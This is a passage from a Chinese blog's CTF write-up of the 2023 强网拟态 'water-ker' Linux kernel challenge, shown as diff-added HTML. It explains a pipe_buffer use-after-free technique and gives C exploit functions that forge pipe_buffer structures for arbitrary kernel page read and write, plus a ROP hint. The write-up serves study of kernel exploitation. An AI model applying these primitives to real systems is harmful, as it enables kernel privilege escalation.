put_page(page);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>注：</p>
+<ul>
+<li>任何一页的内容读完再写入都会另起一个pipe_buffer</li>
+<li>pipe_buffer-&gt;flags没有0x10每次写入之后都会另起一个pipe_buffer</li>
+</ul>
+</blockquote>
+<h2 id="简单一些的利用方式"><a href="#简单一些的利用方式" class="headerlink" title="简单一些的利用方式"></a>简单一些的利用方式</h2><p>有这个特性利用的时候其实可以不用那么复杂</p>
+<p>此时我们已经有了一个uaf</p>
+<img src="/2023/11/30/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-water-ker/tmp1.png" srcset="/img/loading.gif" lazyload class title="tmp1">
+
+<ul>
+<li><p>利用victim write修改snd_victim的目标pipe_buffer，指向要改的page</p>
+<img src="/2023/11/30/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-water-ker/tmp2.png" srcset="/img/loading.gif" lazyload class title="tmp2">
+</li>
+<li><p>victim read读完刚修改的字节数</p>
+<img src="/2023/11/30/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-water-ker/tmp3.png" srcset="/img/loading.gif" lazyload class title="tmp3">
+
+<p>这时victim会将snd_victim所在page放回tmp_page</p>
+</li>
+<li><p>victim再次write的时候会另起一个pipe_buffer，使用tmp_page，也就是snd_victim所在的page，这样就达到了重复修改snd_victim的目的</p>
+<img src="/2023/11/30/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-water-ker/tmp4.png" srcset="/img/loading.gif" lazyload class title="tmp4">
+
+<p>不用担心pipe_buffer消耗完的事情，pipe_buffer会循环使用( •̀ ω •́ )✧</p>
+</li>
+</ul>
+<h2 id="exp需要修改的部分"><a href="#exp需要修改的部分" class="headerlink" title="exp需要修改的部分"></a>exp需要修改的部分</h2><p><em>其实不需要两次uaf，但我用第二次uaf来确定pipd_buffer的index了</em></p>
+<ul>
+<li><p>main函数中删去building_self_writing_pipe</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//building_self_writing_pipe();</span><br>  <br>info_leaking_by_arbitrary_pipe();<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>setup_evil_pipe，消耗之前write的字节</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">setup_evil_pipe</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">char</span> temp_buf[<span class="hljs-number">0x1000</span>];<br>    read(pipe_fd[victim_pid][<span class="hljs-number">0</span>], temp_buf, <span class="hljs-number">0x60</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>arbitrary_read_by_pipe，要改的pipe_buffer是第三个</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">arbitrary_read_by_pipe</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> page *page_to_read, <span class="hljs-type">void</span> *dst)</span><br>&#123;<br>    <span class="hljs-type">char</span> temp_buf[<span class="hljs-number">0x1000</span>];<br><br>    <span class="hljs-comment">/* page to read */</span><br>    evil_2nd_buf.offset = <span class="hljs-number">0</span>;<br>    evil_2nd_buf.len = <span class="hljs-number">0x1ff8</span>;<br>    evil_2nd_buf.page = page_to_read;<br>    evil_2nd_buf.ops = info_pipe_buf.ops;<br>    evil_2nd_buf.private = info_pipe_buf.private;<br>    evil_2nd_buf.flags = info_pipe_buf.flags;<br><br>    write(pipe_fd[victim_pid][<span class="hljs-number">1</span>], temp_zero_buf, <span class="hljs-number">96</span>*<span class="hljs-number">2</span>);<br>    write(pipe_fd[victim_pid][<span class="hljs-number">1</span>], &amp;evil_2nd_buf, <span class="hljs-keyword">sizeof</span>(evil_2nd_buf));<br><br>    read(pipe_fd[snd_vicitm_pid][<span class="hljs-number">0</span>], dst, <span class="hljs-number">0xfff</span>);<br><br>    read(pipe_fd[victim_pid][<span class="hljs-number">0</span>], temp_buf, <span class="hljs-number">96</span>*<span class="hljs-number">2</span> + <span class="hljs-keyword">sizeof</span>(evil_2nd_buf));<br>&#125;<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>arbitrary_write_by_pipe</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">arbitrary_write_by_pipe</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> page *page_to_write, <span class="hljs-type">void</span> *src, <span class="hljs-type">size_t</span> len)</span><br>&#123;<br>    <span class="hljs-type">char</span> temp_buf[<span class="hljs-number">0x1000</span>];<br><br>    evil_2nd_buf.page = page_to_write;<br>    evil_2nd_buf.offset = <span class="hljs-number">0</span>;<br>    evil_2nd_buf.len = <span class="hljs-number">0</span>;<br>    evil_2nd_buf.ops = info_pipe_buf.ops;<br>    evil_2nd_buf.flags = info_pipe_buf.flags;<br>    evil_2nd_buf.private = info_pipe_buf.private;<br><br>    write(pipe_fd[victim_pid][<span class="hljs-number">1</span>], temp_zero_buf, <span class="hljs-number">96</span>*<span class="hljs-number">2</span>);<br>    write(pipe_fd[victim_pid][<span class="hljs-number">1</span>], &amp;evil_2nd_buf, <span class="hljs-keyword">sizeof</span>(evil_2nd_buf));<br><br>    write(pipe_fd[snd_vicitm_pid][<span class="hljs-number">1</span>], src, <span class="hljs-number">0xfff</span>);<br><br>    read(pipe_fd[victim_pid][<span class="hljs-number">0</span>], temp_buf, <span class="hljs-number">96</span>*<span class="hljs-number">2</span> + <span class="hljs-keyword">sizeof</span>(evil_2nd_buf));<br>&#125;<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>rop的时候rsp要加8</p>
+</li>
+</ul>
+<h1 id="TODO"><a href="#TODO" class="headerlink" title="TODO"></a>TODO</h1><ul>
+<li><p>KASLR机制，物理内存探测和映射什么的（其实就是继续系统启动，乐）</p>
+</li>
+<li><p>What is CFI?</p>
+</li>
+</ul>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/CTF/" class="category-chain-item">CTF</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/CTF/WP/" class="category-chain-item">WP</a>
+  
+  
+
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/kernel/" class="print-no-link">#kernel</a>
+      
+        <a href="/tags/wp/" class="print-no-link">#wp</a>
+      
+        <a href="/tags/heap/" class="print-no-link">#heap</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>2023 强网拟态 water-ker</div>
+      <div>http://akaieurus.github.io/2023/11/30/2023强网拟态-water-ker/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Eurus</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年11月30日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2024/01/12/CVE-2022-0847-DirtyPipe/" title="CVE-2022-0847 DirtyPipe">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">CVE-2022-0847 DirtyPipe</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/11/13/Kernel%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/" title="Kernel源码分析-内存管理">
+                        <span class="hidden-mobile">Kernel源码分析-内存管理</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
